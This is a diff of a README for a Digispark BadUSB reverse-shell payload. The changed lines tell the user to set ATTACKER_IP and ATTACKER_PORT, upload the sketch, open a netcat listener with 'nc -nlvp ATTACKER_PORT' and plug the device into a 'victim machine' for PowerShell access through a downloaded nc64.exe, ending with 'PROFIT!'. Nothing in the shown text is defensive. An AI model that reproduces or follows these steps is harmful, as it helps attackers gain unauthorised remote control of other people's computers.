@@ -13,11 +13,11 @@ Calls the attacker, using downloaded `nc64.exe` and opens up a powershell access
 - Check [DigiKeyboardFi](https://github.com/therealhalonen/DigiKeyboardFi) for support it.    
 - Download the .ino, or copy the code.    
 - Open the file or paste the content to/in Arduino IDE.
-- Define:
-	-  `-ArgumentList \'Attacker_IP\', \'Attacker_Port\',`
+- Define where the listener will be:
+	-  `-ArgumentList \'ATTACKER_IP\', \'ATTACKER_PORT\',`
 - Upload to Digispark
 - Establish the listener to attacker machine:
-	- `nc -nlvp PORT`
+	- `nc -nlvp ATTACKER_PORT`
 
 - Plug in to victim machine
 - **PROFIT!**
